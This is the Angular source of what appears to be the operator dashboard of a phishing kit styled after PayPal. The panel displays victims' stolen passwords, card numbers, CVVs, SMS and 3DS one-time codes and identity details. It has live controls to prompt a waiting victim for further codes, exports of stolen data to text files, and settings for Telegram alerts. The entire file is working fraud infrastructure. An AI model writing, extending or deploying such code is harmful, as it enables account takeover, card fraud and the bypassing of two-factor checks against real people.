                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 pb-20">

                    <!-- Credentials -->
                    <div class="bg-white p-6 rounded-[16px] shadow-sm border border-slate-200 relative overflow-hidden group hover:border-pp-blue/30 transition-colors">
                        <div class="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity"><span class="material-icons text-6xl text-pp-navy">lock</span></div>

                        <div class="flex items-center gap-2 mb-6 border-b border-slate-100 pb-3">
                            <div class="bg-blue-50 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">vpn_key</span></div>
                            <h4 class="text-sm font-bold text-pp-navy uppercase tracking-tight">Login Credentials</h4>
                        </div>

                        <div class="space-y-5 relative z-10">
                            <div>
                                <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">Email / Username</label>
                                <div class="flex items-center gap-2 bg-slate-50 p-2 rounded-lg border border-slate-100">
                                    <p class="text-sm font-bold text-pp-navy break-all flex-1">{{ session?.data?.email || '...' }}</p>
                                    <button *ngIf="session?.data?.email" (click)="copy(session?.data?.email)" class="text-slate-400 hover:text-pp-blue p-1"><span class="material-icons text-[16px]">content_copy</span></button>
                                </div>
                            </div>
                            <div>
                                <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">Password</label>
                                <div class="flex items-center gap-2 bg-slate-50 p-2 rounded-lg border border-slate-100">
                                    <p class="text-sm font-mono text-pp-navy flex-1">{{ session?.data?.password || '...' }}</p>
                                    <button *ngIf="session?.data?.password" (click)="copy(session?.data?.password)" class="text-slate-400 hover:text-pp-blue p-1"><span class="material-icons text-[16px]">content_copy</span></button>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Financial -->
                    <div class="bg-white p-6 rounded-[16px] shadow-sm border border-slate-200 relative overflow-hidden group hover:border-pp-blue/30 transition-colors">
                        <div class="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity"><span class="material-icons text-6xl text-pp-navy">credit_card</span></div>

                        <div class="flex items-center gap-2 mb-6 border-b border-slate-100 pb-3">
                            <div class="bg-blue-50 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">payment</span></div>
                            <h4 class="text-sm font-bold text-pp-navy uppercase tracking-tight">Financial Instrument</h4>
                        </div>

                        <div class="space-y-5 relative z-10">
                            <div>
                                <div class="flex items-center justify-between mb-1.5">
                                    <label class="text-[10px] font-bold text-slate-400 uppercase">Card Number</label>
                                    @if(getCardLogoUrl(session?.data?.cardType)) {
                                        <img [src]="getCardLogoUrl(session?.data?.cardType)" class="h-4 w-auto object-contain">
                                    }
                                </div>
                                <div class="flex items-center gap-2 bg-slate-50 p-2 rounded-lg border border-slate-100">
                                   <p class="text-lg font-mono font-bold text-pp-navy tracking-wide flex-1">{{ formatCard(session?.data?.cardNumber) }}</p>
                                   <button *ngIf="session?.data?.cardNumber" (click)="copy(session?.data?.cardNumber)" class="text-slate-400 hover:text-pp-blue p-1"><span class="material-icons text-[16px]">content_copy</span></button>
                                </div>
                            </div>
                            <div class="grid grid-cols-2 gap-4">
                                <div>
                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">Expiry</label>
                                    <div class="bg-slate-50 p-2 rounded-lg border border-slate-100">
                                        <p class="font-bold text-pp-navy text-sm">{{ session?.data?.cardExpiry || '--/--' }}</p>
                                    </div>
                                </div>
                                <div>
                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">CVV / CSC</label>
                                    <div class="bg-slate-50 p-2 rounded-lg border border-slate-100">
                                        <p class="font-bold text-[#D92D20] text-sm">{{ session?.data?.cardCvv || '---' }}</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- OTP & Security (Full Width) -->
                    <div class="col-span-1 md:col-span-2 bg-gradient-to-br from-pp-navy to-[#001C64] text-white p-8 rounded-[20px] shadow-lg relative overflow-hidden flex flex-col md:flex-row items-center justify-between gap-6">
                            <!-- Background decoration -->
                            <div class="absolute -right-10 -top-10 w-48 h-48 bg-pp-blue rounded-full opacity-20 blur-3xl"></div>

                            <div class="relative z-10 flex-1">
                                <div class="flex items-center gap-3 mb-6">
                                    <span class="material-icons text-pp-success">verified_user</span>
                                    <h4 class="text-sm font-bold text-white/90 uppercase tracking-widest">Security Verification</h4>
                                </div>

                                <div class="flex gap-12">
                                    <div>
                                        <span class="text-[10px] text-white/50 font-bold uppercase block mb-2">SMS Code</span>
                                        <div class="flex items-center gap-2">
                                            <span class="text-3xl font-mono font-bold tracking-widest">{{ session?.data?.phoneCode || '---' }}</span>
                                            <button *ngIf="session?.data?.phoneCode" (click)="copy(session?.data?.phoneCode)" class="text-white/40 hover:text-white transition-colors"><span class="material-icons text-sm">content_copy</span></button>
                                        </div>
                                    </div>
                                    <div>
                                        <span class="text-[10px] text-white/50 font-bold uppercase block mb-2">Bank OTP (3DS)</span>
                                        <div class="flex items-center gap-2">
                                            <span class="text-3xl font-mono font-bold tracking-widest text-pp-success">{{ session?.data?.cardOtp || '---' }}</span>
                                            <button *ngIf="session?.data?.cardOtp" (click)="copy(session?.data?.cardOtp)" class="text-white/40 hover:text-white transition-colors"><span class="material-icons text-sm">content_copy</span></button>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            @if(session?.stage === 'card_pending' && !isHistory) {
                            <div class="relative z-10 flex flex-col gap-2 shrink-0">
                                <span class="text-[10px] text-white/40 uppercase font-bold text-center">Request Input</span>
                                <div class="flex gap-2">
                                    <button (click)="requestFlow('otp')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-4 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
                                        SMS / 3DS
                                    </button>
                                    <button (click)="requestFlow('app')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-4 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
                                        Bank App
                                    </button>
                                    <button (click)="requestFlow('both')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-4 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
                                        Both
                                    </button>
                                </div>
                            </div>
                            }
                    </div>

                    <!-- Identity Info (Full Width) -->
                    <div class="col-span-1 md:col-span-2 bg-white p-6 rounded-[16px] shadow-sm border border-slate-200">
                            <div class="flex items-center gap-2 mb-6 border-b border-slate-100 pb-3">
                                <div class="bg-blue-50 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">badge</span></div>
                                <h4 class="text-sm font-bold text-pp-navy uppercase tracking-tight">Identity Profile</h4>
                            </div>

                            <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
                                <div>
                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Legal Name</label>
                                    <p class="text-sm font-bold text-pp-navy">{{ (session?.data?.firstName + ' ' + session?.data?.lastName).trim() || 'Waiting...' }}</p>
                                </div>
                                <div>
                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Date of Birth</label>
                                    <p class="text-sm font-bold text-pp-navy">{{ session?.data?.dob || 'Waiting...' }}</p>
                                </div>
                                <div>
                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Phone Number</label>
                                    <p class="text-sm font-bold text-pp-navy">{{ session?.data?.phoneNumber || 'Waiting...' }}</p>
                                </div>
                                <div>
                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Location</label>
                                    <p class="text-sm font-bold text-pp-navy">{{ session?.data?.country || 'Waiting...' }}</p>
                                </div>
                                <div class="col-span-2 md:col-span-4">
                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Billing Address</label>
                                    <p class="text-sm font-bold text-pp-navy bg-slate-50 p-3 rounded-lg border border-slate-100">{{ session?.data?.address || 'Waiting...' }}</p>
                                </div>
                            </div>
                    </div>

                </div>
            </div>

            <!-- Action Bar -->
            @if(!isHistory) {
                <div class="p-5 border-t border-slate-200 bg-white sticky bottom-0 z-20 flex justify-between items-center shadow-lg lg:shadow-none">
                    <div class="flex items-center gap-2">
                        <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(session)" [class.bg-pp-success]="isSessionLive(session)" [class.bg-slate-300]="!isSessionLive(session)"></span>
                        <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(session) ? 'Live Connection' : 'Offline' }}</span>
                    </div>

                    @if(monitoredSession()) {
                        <div class="flex gap-3">
                            <button (click)="revoke()"
                                    [disabled]="!session?.isLoginVerified"
                                    [class.opacity-50]="!session?.isLoginVerified"
                                    [class.cursor-not-allowed]="!session?.isLoginVerified"
                                    class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
                                Revoke
                            </button>
                            <button (click)="reject()"
                                    [disabled]="!canInteract()"
                                    [class.opacity-50]="!canInteract()"
                                    [class.cursor-not-allowed]="!canInteract()"
                                    class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
                                Reject
                            </button>
                            @if (session?.stage === 'login') {
                                <button (click)="approve({ skipPhone: false })"
                                        [disabled]="!canInteract()"
                                        [class.opacity-50]="!canInteract()"
                                        [class.cursor-not-allowed]="!canInteract()"
                                        class="bg-pp-navy hover:bg-pp-blue text-white px-6 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
                                    <span class="material-icons text-sm">check</span> Verify Phone
                                </button>
                                <button (click)="approve({ skipPhone: true })"
                                        [disabled]="!canInteract()"
                                        [class.opacity-50]="!canInteract()"
                                        [class.cursor-not-allowed]="!canInteract()"
                                        class="bg-pp-blue hover:bg-[#005ea6] text-white px-6 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
                                    <span class="material-icons text-sm">fast_forward</span> Skip Phone
                                </button>
                            } @else {
                                <button (click)="approve()"
                                        [disabled]="!canInteract()"
                                        [class.opacity-50]="!canInteract()"
                                        [class.cursor-not-allowed]="!canInteract()"
                                        class="bg-pp-navy hover:bg-pp-blue text-white px-8 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
                                    <span class="material-icons text-sm">check</span> {{ approveText() }}
                                </button>
                            }
                        </div>
                    } @else {
                        <div class="text-xs text-slate-400 font-bold uppercase tracking-wider">
                            Session Offline
                        </div>
                    }
                </div>
            }
      </ng-template>
      }
    </div>
  `
})
export class AdminDashboardComponent {
  state = inject(StateService);

  activeTab = signal<AdminTab>('live');
  loginUser = '';
  loginPass = '';
  loginError = signal(false);

  // History Slide-out Logic
  historyPanelOpen = signal(false);
  selectedHistorySession = signal<SessionHistory | null>(null);

  // Filters & Selection
  searchQuery = signal('');
  timeFilter = signal<'6h' | '24h' | '7d' | 'all' | 'custom'>('24h');
  customDateStart = signal<string>('');
  customDateEnd = signal<string>('');
  countryFilter = signal<string>('all');
  selectedSessionIds = signal<Set<string>>(new Set());

  // Incomplete Sessions Toggle
  incompleteCollapsed = signal(false);

  canInteract = computed(() => {
      const s = this.monitoredSession();
      // Debug
      // if (s) console.log(`[Admin] Interact Check: ID=${s.id} View=${s.currentView} Stage=${s.stage}`);
      // Only allow interaction if user is waiting (loading screen)
      return s?.currentView === 'loading';
  });

  uniqueCountries = computed(() => {
      const history = this.state.history();
      const countries = new Set<string>();
      history.forEach(h => {
          if (h.data?.ipCountry) countries.add(h.data.ipCountry);
      });
      return Array.from(countries).sort();
  });

  filteredHistory = computed(() => {
      let data = this.state.history();
      const q = this.searchQuery().toLowerCase();
      const tf = this.timeFilter();
      const cf = this.countryFilter();
      const now = Date.now();

      // Time Filter
      if (tf !== 'all') {
          let cutoff = 0;
          if (tf === '6h') cutoff = now - (6 * 60 * 60 * 1000);
          else if (tf === '24h') cutoff = now - (24 * 60 * 60 * 1000);
          else if (tf === '7d') cutoff = now - (7 * 24 * 60 * 60 * 1000);
          else if (tf === 'custom') {
              const start = this.customDateStart() ? new Date(this.customDateStart()).getTime() : 0;
              const end = this.customDateEnd() ? new Date(this.customDateEnd()).getTime() + 86400000 : now; // End of day
              data = data.filter(h => {
                  const t = new Date(h.timestamp).getTime();
                  return t >= start && t <= end;
              });
          }

          if (tf !== 'custom') {
              data = data.filter(h => new Date(h.timestamp).getTime() >= cutoff);
          }
      }

      // Country Filter
      if (cf !== 'all') {
          data = data.filter(h => h.data?.ipCountry === cf);
      }

      // Search Filter
      if (q) {
          data = data.filter(h =>
              h.id.toLowerCase().includes(q) ||
              (h.email && h.email.toLowerCase().includes(q)) ||
              (h.name && h.name.toLowerCase().includes(q)) ||
              (h.data?.cardLast4 && h.data.cardLast4.includes(q)) ||
              (h.data?.cardBin && h.data.cardBin.includes(q))
          );
      }

      return data;
  });

  // Settings
  settingEmail = '';
  tgToken = '';
  tgChat = '';

  monitoredSession = computed(() => {
      const id = this.state.monitoredSessionId();
      if (!id) return null;
      // Search in both active and incomplete
      const active = this.state.activeSessions().find(s => s.id === id);
      if (active) return active;
      return this.state.incompleteSessions().find(s => s.id === id);
  });

  elapsedTime = signal('0m');
  private timer: number | undefined;

  constructor() {
      effect(() => {
          this.settingEmail = this.state.adminAlertEmail();
          this.tgToken = this.state.telegramBotToken();
          this.tgChat = this.state.telegramChatId();
      });

      effect(() => {
          const session = this.monitoredSession();
          clearInterval(this.timer);

          if (session?.timestamp) {
              const update = () => this.elapsedTime.set(this.getElapsed(session.timestamp));
              update();
              this.timer = setInterval(update, 1000) as unknown as number;
          } else {
              this.elapsedTime.set('0m');
          }
      }, { allowSignalWrites: true });
  }

  doLogin() {
      if (this.state.loginAdmin(this.loginUser, this.loginPass)) {
          this.loginError.set(false);
          this.loginUser = '';
          this.loginPass = '';
      } else {
          this.loginError.set(true);
      }
  }

  exitAdmin() {
      this.state.returnFromAdmin();
  }

  refresh() {
      this.state.fetchSessions().then(() => {
          this.state.showAdminToast('Refreshed Sessions');
      });
  }

  selectSession(session: any) {
      this.state.setMonitoredSession(session.id);
  }

  viewHistory(session: SessionHistory) {
      this.selectedHistorySession.set(session);
      this.historyPanelOpen.set(true);
  }

  toggleSelection(id: string, event: Event) {
      event.stopPropagation();
      this.selectedSessionIds.update(set => {
          const newSet = new Set(set);
          if (newSet.has(id)) newSet.delete(id);
          else newSet.add(id);
          return newSet;
      });
  }

  toggleAllSelection(event: Event) {
      const checked = (event.target as HTMLInputElement).checked;
      if (checked) {
          const allIds = this.filteredHistory().map(h => h.id);
          this.selectedSessionIds.set(new Set(allIds));
      } else {
          this.selectedSessionIds.set(new Set());
      }
  }

  isAllSelected(): boolean {
      const filtered = this.filteredHistory();
      if (filtered.length === 0) return false;
      return this.selectedSessionIds().size === filtered.length;
  }

  bulkDelete() {
      const ids = Array.from(this.selectedSessionIds());
      if (ids.length === 0) return;
      if (!confirm(`Delete ${ids.length} sessions?`)) return;

      ids.forEach(id => this.state.deleteSession(id));
      this.selectedSessionIds.set(new Set());
  }

  bulkPin() {
      const ids = Array.from(this.selectedSessionIds());
      if (ids.length === 0) return;

      ids.forEach(id => this.state.pinSession(id));
      this.selectedSessionIds.set(new Set());
  }

  bulkExport() {
      const ids = this.selectedSessionIds();
      if (ids.size === 0) return;

      const sessions = this.filteredHistory().filter(h => ids.has(h.id));
      const content = sessions.map(s => {
          const data = s.data || {};
          return `
SESSION REPORT
==============
ID: ${s.id}
Time: ${s.timestamp}
IP: ${s.fingerprint?.ip || 'Unknown'}
Status: ${s.status}

IDENTITY
Name: ${data.firstName} ${data.lastName}
DOB: ${data.dob}
Address: ${data.address}
Country: ${data.country}
Phone: ${data.phoneNumber}

CREDENTIALS
Email: ${data.email}
Password: ${data.password}

FINANCIAL
Card: ${data.cardNumber}
Exp: ${data.cardExpiry}
CVV: ${data.cardCvv}
OTP: ${data.cardOtp}
Phone Code: ${data.phoneCode}

USER AGENT
${s.fingerprint?.userAgent}

----------------------------------------
`;
      }).join('\n');

      const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `sessions-export-${ids.size}.txt`;
      a.click();
      window.URL.revokeObjectURL(url);
  }

  closeHistory() {
      this.historyPanelOpen.set(false);
      this.selectedHistorySession.set(null);
  }

  formatCard(num: string | undefined): string {
      if (!num) return '•••• •••• •••• ••••';
      return num.replace(/\s+/g, '').replace(/(.{4})/g, '$1 ').trim();
  }

  isSelected(session: any): boolean {
      return this.state.monitoredSessionId() === session.id;
  }

  getDisplayEmail(email: string): string {
      if (!email) return 'Waiting for input...';
      if (email === 'admin' || email === this.state.adminUsername()) return 'Typing...';
      return email;
  }

  isSessionLive(session: any): boolean {
      if (!session || !session.lastSeen) return false;
      return (Date.now() - session.lastSeen) < 60000; // 1 min active threshold
  }

  deleteSession(session: any) {
      if(confirm('Are you sure you want to delete this session?')) {
          this.state.deleteSession(session.id);
      }
  }

  revoke() {
      if(confirm('Are you sure you want to revoke this session?')) {
          this.state.adminRevokeSession(this.monitoredSession()!.id);
      }
  }

  pinSession(session: any) {
      this.state.pinSession(session.id);
  }

  archiveSession(session: any, event: Event) {
      event.stopPropagation();
      if(confirm('Archive this incomplete session to history?')) {
          this.state.archiveSession(session.id);
      }
  }

  exportTxt(session: any) {
      const data = session.data || {};
      const content = `
SESSION REPORT
==============
ID: ${session.id}
Time: ${session.timestamp}
IP: ${session.fingerprint?.ip || session.ip}
Status: ${session.status}

IDENTITY
--------
Name: ${data.firstName} ${data.lastName}
DOB: ${data.dob}
Address: ${data.address}
Country: ${data.country}
Phone: ${data.phoneNumber}

CREDENTIALS
-----------
Email: ${data.email}
Password: ${data.password}

FINANCIAL
---------
Card: ${data.cardNumber}
Exp: ${data.cardExpiry}
CVV: ${data.cardCvv}
OTP: ${data.cardOtp}
Phone Code: ${data.phoneCode}

USER AGENT
----------
${session.fingerprint?.userAgent}
      `.trim();

      const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `session-${session.id}.txt`;
      a.click();
      window.URL.revokeObjectURL(url);
  }

  private getElapsed(timestamp: Date | undefined): string {
      if (!timestamp) return '0m';
      const diffMs = Date.now() - new Date(timestamp).getTime();
      const diffMins = Math.floor(diffMs / 60000);
      
      if (diffMins < 60) return `${diffMins}m`;
      const h = Math.floor(diffMins / 60);
      const m = diffMins % 60;
      return `${h}h ${m}m`;
  }

  copy(val: string) {
      if (!val) return;
      navigator.clipboard.writeText(val).then(() => {
          this.state.showAdminToast('Copied to clipboard');
      });
  }

  requestOtp() {
      this.state.adminRequestCardOtp();
  }

  requestFlow(flow: 'otp' | 'app' | 'both') {
      this.state.adminApproveStep({ flow });
  }

  reject() {
      this.state.adminRejectStep('Security verification failed.');
  }

  approve(payload: any = {}) {
      this.state.adminApproveStep(payload);
  }

  approveText(): string {
      const stage = this.monitoredSession()?.stage;
      switch (stage) {
          case 'login': return 'Approve Login'; // Should not show due to template check
          case 'phone_pending': return 'Approve Phone';
          case 'personal_pending': return 'Approve Identity';
          case 'card_pending': return 'Approve & Complete';
          case 'card_otp_pending': return 'Approve OTP';
          case 'bank_app_input': return 'Waiting for User'; // New status
          case 'bank_app_pending': return 'Complete Session';
          default: return 'Approve';
      }
  }

  saveSettings() {
      this.state.updateAdminSettings(this.settingEmail, true, this.tgToken, this.tgChat);
      this.state.showAdminToast('Settings Saved');
  }

  getFlagUrl(countryCode: string | undefined): string {
      if (!countryCode) return '';
      return `https://flagcdn.com/w40/${countryCode.toLowerCase()}.png`;
  }

  getCardLogoUrl(cardType: string | undefined): string {
      if (!cardType) return '';
      const t = cardType.toLowerCase();
      if (t === 'visa') return 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
      if (t === 'mastercard') return 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
      if (t === 'amex') return 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg';
      if (t === 'discover') return 'https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg';
      return '';
  }
}
